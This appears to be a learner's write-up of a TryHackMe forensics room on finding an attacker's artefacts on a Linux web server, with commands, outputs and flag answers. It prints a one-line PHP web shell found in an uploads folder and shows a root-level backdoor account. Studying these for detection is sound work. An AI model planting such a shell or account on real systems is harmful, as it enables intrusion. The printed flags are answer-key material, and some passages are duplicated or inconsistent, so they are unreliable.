<p align="center">November 8, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{186}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{ Linux File System Analysis }}$$
</h1>
<p align="center">Perform real-time file system analysis on a Linux system to identify an attacker's artefacts.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/linuxfilesystemanalysis">Linux File System Analysis</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/fdaa9e0d-9485-4f5d-a6eb-33c69aa9cee9">
  <img height="150px" src="https://github.com/user-attachments/assets/4c008c9d-040a-4590-93f0-4e4e42e557cb">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Investigation Setup](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [File, Permissions, and Timestamps](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [Users and Groups](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Room Complete](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#6) </p>

<br>
<br>
<br>
<h2>Task 1. Introduction<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 1.1. <em>I'm ready to continue!</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 2. Investigation Setup<a id='2'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 2.1. <em>After updating the <code>PATH</code> and <code>LD_LIBRARY_PATH</code> environment variables, run the command >code>check-env</code>. What is the flag that is returned in the output?</em><br><a id='1.1'></a>
>> <code><strong>THM{5514ec4f1ce82f63867806d3cd95dbd8}</strong></code>

<pre><code>$ investigator@ip-[Target_IP]:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@ip-[Target_IP]:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
investigator@ip-[Target_IP]:~$ check-env
THM{5514ec4f1ce82f63867806d3cd95dbd8}
</code></pre>

<h2>Task 3. Files, Permissions, and Timestamps<a id='3'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

<pre><code>$  ls -al /var/www/html/
total 32
drwxr-xr-x 4 root     root      4096 Feb 12  2024 .
drwxr-xr-x 3 root     root      4096 Feb 12  2024 ..
drwxr-xr-x 2 www-data www-data  4096 Feb 13  2024 assets
-rw-r--r-- 1 root     root     10918 Feb 12  2024 index.html
-rwxr-xr-x 1 www-data www-data   905 Feb 12  2024 upload.php
drwxr-xr-x 2 www-data www-data  4096 Feb 13  2024 uploads
investigator@ip-10-10-229-35:~$ ls -al var/www/html/uploads
ls: cannot access 'var/www/html/uploads': No such file or directory
investigator@ip-10-10-229-35:~$ ls -al /var/www/html/uploads
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13  2024 .
drwxr-xr-x 4 root     root     4096 Feb 12  2024 ..
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ABHz3aj.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AhVpDoS.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AqLnBvC.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AsDfGhJ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 AzSxWqE.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 BcFvGtR.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 BcNmLoP.jpeg
...
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 YmLnXhP.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 YtGfHjK.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZtXcVbN.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZxVbNmQ.jpeg
-rw-r--r-- 1 www-data www-data 1908 Feb 12  2024 ZxXcVuY.jpeg
-rw-r--r-- 1 www-data www-data   30 Feb 13  2024 b2c8e1f5.phtml
</code></pre>


<pre><code>investigator@ip-10-10-229-35:~$ ls -al /var/www/html/uploads | grep -v ".jpeg"
total 224
drwxr-xr-x 2 www-data www-data 4096 Feb 13  2024 .
drwxr-xr-x 4 root     root     4096 Feb 12  2024 ..
-rw-r--r-- 1 www-data www-data   30 Feb 13  2024 b2c8e1f5.phtml
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ cat /var/www/html/uploads/b2c8e1f5.phtml 
<?php system($_GET['cmd']);?>
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ investigator@ip-10-10-229-35:~$ find / -user www-data -type f 2>/dev/null | less
/var/www/html/assets/reverse.elf
/var/www/html/uploads/MzCxVeR.jpeg
/var/www/html/uploads/AzSxWqE.jpeg
/var/www/html/uploads/QaWsEdR.jpeg
/var/www/html/uploads/TyHjKlM.jpeg
/var/www/html/uploads/PrTgHfD.jpeg
/var/www/html/uploads/YmLnXhP.jpeg
/var/www/html/uploads/LuDjYnW.jpeg
/var/www/html/uploads/LvXcBvN.jpeg
/var/www/html/uploads/AsDfGhJ.jpeg
/var/www/html/uploads/CoSaBmQ.jpeg
/var/www/html/uploads/XkFgHtD.jpeg
/var/www/html/uploads/RfTbMeG.jpeg
/var/www/html/uploads/AqLnBvC.jpeg
/var/www/html/uploads/WzRmDnT.jpeg
/var/www/html/uploads/DnCvBzX.jpeg
/var/www/html/uploads/ZxVbNmQ.jpeg
/var/www/html/uploads/ABHz3aj.jpeg
/var/www/html/uploads/ZxXcVuY.jpeg
/var/www/html/uploads/XcVbNmQ.jpeg
/var/www/html/uploads/KtXoRlN.jpeg
/var/www/html/uploads/RoNpIqU.jpeg
/var/www/html/uploads/XcVbNkL.jpeg
/var/www/html/uploads/VbNmLoP.jpeg
/var/www/html/uploads/YtGfHjK.jpeg
/var/www/html/uploads/BcNmLoP.jpeg
/var/www/html/uploads/LrOjfHa.jpeg
/var/www/html/uploads/LmKdFgH.jpeg
/var/www/html/uploads/FgHyJuK.jpeg
/var/www/html/uploads/BcFvGtR.jpeg
/var/www/html/uploads/DvBnMcP.jpeg
/var/www/html/uploads/QwErTyU.jpeg
/var/www/html/uploads/NcVbOpQ.jpeg
/var/www/html/uploads/FeWcNzT.jpeg
/var/www/html/uploads/PwSaBcZ.jpeg
/var/www/html/uploads/FgHjKlM.jpeg
/var/www/html/uploads/JnKmLoP.jpeg
/var/www/html/uploads/PqAwSdE.jpeg
/var/www/html/uploads/LkMjNhB.jpeg
/var/www/html/uploads/ZtXcVbN.jpeg
/var/www/html/uploads/MqQwErT.jpeg
/var/www/html/uploads/AhVpDoS.jpeg
/var/www/html/uploads/PoGmHsR.jpeg
/var/www/html/uploads/JyGtFdS.jpeg
/var/www/html/uploads/QeRtYuI.jpeg
/var/www/html/uploads/JiRpKaW.jpeg
/var/www/html/uploads/VwPyLoR.jpeg
/var/www/html/uploads/HjGfSdA.jpeg
/var/www/html/uploads/TRWaPSB.jpeg
/var/www/html/uploads/UiJhYtG.jpeg
/var/www/html/uploads/EpSjZxM.jpeg
/var/www/html/uploads/PlKjHgF.jpeg
/var/www/html/uploads/b2c8e1f5.phtml
/var/www/html/uploads/EsKyLbQ.jpeg
/var/www/html/uploads/GQzVDrM.jpeg
/var/www/html/upload.php
...
  
</code></pre>

<pre><code> ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
</code></pre>

<pre><code> ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
</code></pre>investigator@ip-10-10-229-35:~$ ls -l /var/www/html/assets/reverse.elf 
-rwxr-xr-x 1 www-data www-data 250 Feb 13  2024 /var/www/html/assets/reverse.elf
investigator@ip-10-10-229-35:~$ ^C
investigator@ip-10-10-229-35:~$ exiftool /var/www/html/assets/reverse.elf 
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:02:13 00:32:59+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
investigator@ip-10-10-229-35:~$ 
</code></pre>


<pre><code>investigator@ip-10-10-229-35:~$ md5sum /var/www/html/assets/reverse.elf 
c6cbdba1c147fbb7239284b7df2aa653  /var/www/html/assets/reverse.elf
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ sha256sum /var/www/html/assets/reverse.elf
ee0ea8d8bc205c4e2e2cc9ff7ddb71dee22ac0a50c2042701d49e565e0821410  /var/www/html/assets/reverse.elf
</code></pre>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 3.1. <em>To practice your skills with the <code>find</code> command, locate all the files that the user <code>bob</code> created in the past 1 minute. Once found, review its contents. What is the flag you receive?</em><br><a id='3.1'></a>
>> <code><strong>THM{0b1313afd2136ca0faafb2daa2b430f3}</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ find / -user bob -type f -cmin -1 > bob
</code></pre>

<pre><code>investigator@ip-10-10-229-35:~$ cat bob | grep .txt
investigator@ip-10-10-229-35:~$ cat /var/tmp/findme.txt
THM{0b1313afd2136ca0faafb2daa2b430f3}
</code></pre>

> 3.2. <em>Extract the metadata from the <code>reverse.elf</code> file. What is the file's MIME type?</em><br><a id='3.2'></a>
>> <code><strong>application/octet-stream</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ exiftool /var/www/html/assets/reverse.elf
ExifTool Version Number         : 11.88
File Name                       : reverse.elf
Directory                       : /var/www/html/assets
File Size                       : 250 bytes
File Modification Date/Time     : 2024:02:13 00:26:28+00:00
File Access Date/Time           : 2024:11:08 19:55:06+00:00
File Inode Change Date/Time     : 2024:02:13 00:34:50+00:00
File Permissions                : rwxr-xr-x
File Type                       : ELF executable
File Type Extension             : 
MIME Type                       : application/octet-stream
CPU Architecture                : 64 bit
CPU Byte Order                  : Little endian
Object File Type                : Executable file
CPU Type                        : AMD x86-64
</code></pre>


> 3.3. <em>Run the <code>stat</code> command against the <code>/etc/hosts</code> file on the compromised web server. What is the full <code>Modify Timestamp (mtime)</code> value?</em><br><a id='3.3'></a>
>> <code><strong>2020-10-26 21:10:44.000000000 +0000</strong></code>

<pre><code>investigator@ip-10-10-229-35:~$ stat /etc/hosts
  File: /etc/hosts
  Size: 221       Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713dInode: 49          Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-11-08 19:31:25.108000000 +0000
Modify: 2020-10-26 21:10:44.000000000 +0000
Change: 2020-10-26 23:32:25.957900650 +0000
 Birth: -
</code></pre>

<br>
<h2>Task 4. Users and Groups<a id='4'></a></h2>
<p>As we continue our investigation, we should focus on the system's users and groups. In doing so, we may uncover evidence of the attacker moving laterally or maintaining access throughout the system by exploiting additional vulnerabilities.</p>

<h3>Identifying User Accounts</h3>

<p>Within UNIX-like systems, the /etc/ directory is a central location that stores configuration files and system-wide settings. Specifically, when investigating user accounts, <code>/etc/passwd</code>code> is a colon-separated plaintext file that contains a list of the system's accounts and their attributes, such as the user ID (UID), group ID (GID), home directory location, and the login shell defined for the user.</p>

<p>Let's view the user accounts on the affected system by reading the file:</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
...
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
bob:x:1001:1001::/home/bob:/bin/bash
jane:x:1002:1002:Jane Walkers,103,9399499494,2029384958:/home/jane:/bin/bash
investigator:x:1003:1003:Investigator,1,1,1,1:/home/investigator:/bin/bash
postfix:x:113:120::/var/spool/postfix:/usr/sbin/nologin
b4ckd00r3d:x:0:1004::/home/b4ckd00r3d:/bin/sh
</code></pre>

<p>Attackers can maintain access to a system by creating a backdoor user with root permissions. We can leverage the <code>cut</code> and <code>grep</code> commands to identify this type of user account backdoor quickly. The following command extracts and displays all user accounts with the user ID (UID) of 0. The presence of a user with UID 0, other than the legitimate root user account, can quickly suggest a potential backdoor account.</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /etc/passwd | cut -d: -f1,3 | grep ':0$'
root:0
b4ckd00r3d:0
</code></pre>

<p>In the above command, we first display the contents of the <code>/etc/passwd</code> file. We then take the contents and perform a <code>cut</code> action to extract only the first (username) and third (user ID) fields from each line, delimited (<code>-d</code> by the <code>:</code> character. We then use the <code>grep</code> command to extract specific entries containing <code>:0</code>, signifying a user ID of 0.<br>

This, however, is not a foolproof method, as the backdoor account could have been created with legitimate user and group IDs. For further investigation, we can take a look at <code>groups</code>.</p>

<h3>Identifying Groups</h3>
<p>In Linux systems, certain groups grant specific privileges that attackers may target to escalate their privileges. Some important Linux groups that might be of interest to an attacker include:</p>

<p>.................</p>

<p>We can view all of the groups (and their respective group IDs) on the system by reading the <code>/etc/group</code>code> file:</p>

<pre><code>investigator@ip-10-10-226-120:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,ubuntu,investigator
tty:x:5:syslog
...
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
...
bob:x:1001:
jane:x:1002:
investigator:x:1003:
postfix:x:120:
postdrop:x:121:
b4ckd00r3d:x:1004:
</code></pre>

<br>
<p>To determine which groups a specific user is a member of, we can run the following command:</p>
<br>

<pre><code>investigator@ip-10-10-226-120:~$ groups investigator
investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
</code></pre>

<br>

<p>Alternatively, to list all of the members of a specific group, we can run the following command:</p>

<pre><code>investigator@ip-10-10-226-120:~$ groups investigator
investigator : investigator adm dialout cdrom floppy sudo audio dip video plugdev netdev lxd
</code></pre>

<p>Alternatively, to list all of the members of a specific group, we can run the following command:</p>p>


<pre><code>investigator@ip-10-10-226-120:~$ getent group admin
admin:x:116:
</code></pre>

<p>If multiple users are in a group (as seen above), their usernames will be listed in a comma-separated format in the entry.<br>

To list all users in the sudo group, we can provide either the name "sudo" or the group ID, typically 27.</p>

<pre><code>investigator@ip-10-10-226-120:~$ getent group 27
sudo:x:27:ubuntu,investigator
</code></pre>

<h3>User Logins and Activity</h3>
<p>Checking user logins and activity is valuable for performing a real-time analysis of a compromised system. Fortunately, a couple of useful utilities and logs can assist us.<br>

<strong>last and lastb</strong><br>

The <code>last</code> command is an excellent tool for examining user logins and sessions. It is used to display the history of the last logged-in users. It works by reading the <code>/var/log/wtmp</code> file, which is a file that contains every login and logout activity on the system. Similarly, <code>lastb</code> specifically tracks failed login attempts by reading the contents of /var/log/btmp, which can help identify login and password attacks.</p>

<pre><code>investigator@ip-10-10-226-120:~$ last
investig pts/0        10.100.2.80      Fri Nov  8 22:52   still logged in
reboot   system boot  5.4.0-1029-aws   Fri Nov  8 22:50   still running
investig pts/1        10.10.101.34     Tue Feb 13 02:23 - crash (269+20:26)
investig pts/0        10.10.101.34     Tue Feb 13 02:16 - 02:22  (00:05)
reboot   system boot  5.4.0-1029-aws   Tue Feb 13 02:14   still running
jane     pts/1        10.10.101.34     Tue Feb 13 00:36 - crash  (01:37)
jane     pts/1        10.10.101.34     Tue Feb 13 00:35 - 00:36  (00:01)
investig pts/0        10.10.101.34     Tue Feb 13 00:31 - crash  (01:43)
reboot   system boot  5.4.0-1029-aws   Tue Feb 13 00:28   still running
ubuntu   pts/0        10.13.46.43      Mon Feb 12 23:05 - crash  (01:23)
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 23:05   still running
ubuntu   pts/0        10.13.46.43      Mon Feb 12 21:22 - crash  (01:42)
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 21:21   still running
...
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 16:30   still running
ubuntu   pts/0        10.13.46.43      Mon Feb 12 16:24 - crash  (00:05)
ubuntu   pts/1        10.13.46.43      Mon Feb 12 16:20 - crash  (00:09)
ubuntu   pts/0        10.13.46.43      Mon Feb 12 16:16 - 16:20  (00:04)
reboot   system boot  5.4.0-1029-aws   Mon Feb 12 16:11   still running
</code></pre>


<strong>lastlog</strong><br>

<p>Unlike the <code>last</code> command, which provides information about all user logins, the <code>lastlog</code> command focuses on a user's most recent login activity and reads from the <code>/var/log/lastlog</code>code> file.</p>

<pre><code>investigator@ip-10-10-226-120:~$ lastlog
Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
sys                                        **Never logged in**
sync                                       **Never logged in**
games                                      **Never logged in**
...
bob              pts/0    10.13.46.43      Mon Feb 12 19:00:00 +0000 2024
jane             pts/1    10.10.101.34     Tue Feb 13 00:36:37 +0000 2024
investigator     pts/0    10.100.2.80      Fri Nov  8 22:52:37 +0000 2024
postfix                                    **Never logged in**
b4ckd00r3d                                 **Never logged in**
</code></pre>

<strong>Failed Login Attempts</strong><br>
<p>In addition to <code>lastb</code>, there are other ways to view failed login attempts on Linux through specific log files. The <code>/var/log/auth.log</code> file (or <code>/var/log/secure</code> on some distributions like CentOS or Red Hat) contains records of authentication-related events, including both successful and failed login attempts.</p>

<strong>who</strong><br>
<p>The <code>who</code> command is a very straightforward command that can be used to display the users that are currently logged into the system. The output of this command can provide details such as the name of the user logged in, the terminal device used, the time that the session was established, idle activity, the process ID of the shell, and additional comments that may include details such as the initial command used to start the session.</p>

<pre><code>investigator@ip-10-10-226-120:~$ who
investigator pts/0        2024-11-08 22:52 (10.100.2.80)
</code></pre>

<h3>Sudo</h3>
<p>The <code>/etc/sudoers</code> file is a particularly sensitive configuration file within Unix-like systems. It determines which users possess sudo privileges, enabling them to execute commands as other users, typically the root user.<br>

As a result, it can be a target for attackers seeking persistence. For instance, if an attacker can find a way to insert their user account (or one that they control) into the sudoers file, they could grant themselves elevated privileges without requiring authentication. Alternatively, they may alter existing entries to broaden their access.<br>

For example, a line in a sudoers file might look like this:</p>

<pre><code>investigator@ip-10-10-226-120:~$ sudo cat /etc/sudoers
[sudo] password for investigator: 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaultsenv_reset
Defaultsmail_badpass
Defaultssecure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
rootALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudoALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d

jane ALL=(ALL) /usr/bin/pstree
</code></pre>

<p>More specifically, this line specifies:</p>

<p>..............................</p>

<p>With this configuration, Richard can execute <code>ifconfig</code> with elevated sudo privileges to manage network interfaces as necessary.</p>



<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>


> 4.1. <em>Investigate the user accounts on the system. What is the name of the backdoor account that the attacker created??</em><br><a id='4.1'></a>
>> <code><strong>____}</strong></code>

<br>

> 4.2. <em>What is the name of the group with the group ID of <code>46</code>?</em><br><a id='4.2'></a>
>> <code><strong>____}</strong></code>

<br>

> 4.3. <em>View the /etc/sudoers file on the compromised system. What is the full path of the binary that Jane can run as sudo?</em><br><a id='4.3'></a>
>> <code><strong>____}</strong></code>




